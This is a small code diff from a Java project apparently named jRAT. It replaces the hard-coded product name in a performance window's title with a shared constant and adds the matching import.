@@ -21,6 +21,7 @@ import javax.swing.JProgressBar;
 import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.border.EmptyBorder;
 
+import pro.jrat.Constants;
 import pro.jrat.common.Version;
 import pro.jrat.threads.ThreadLocalRAM;
 import pro.jrat.ui.panels.PanelImage;
@@ -49,7 +50,7 @@ public class FramePerformance extends BaseFrame {
 		instance = this;
 		setResizable(false);
 		setIconImage(Toolkit.getDefaultToolkit().getImage(FramePerformance.class.getResource("/icons/meter.png")));
-		setTitle("jRAT " + Version.getVersion() + " Performance");
+		setTitle(Constants.NAME + " " + Version.getVersion() + " Performance");
 		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
 		setBounds(100, 100, 450, 233);
 		contentPane = new JPanel();
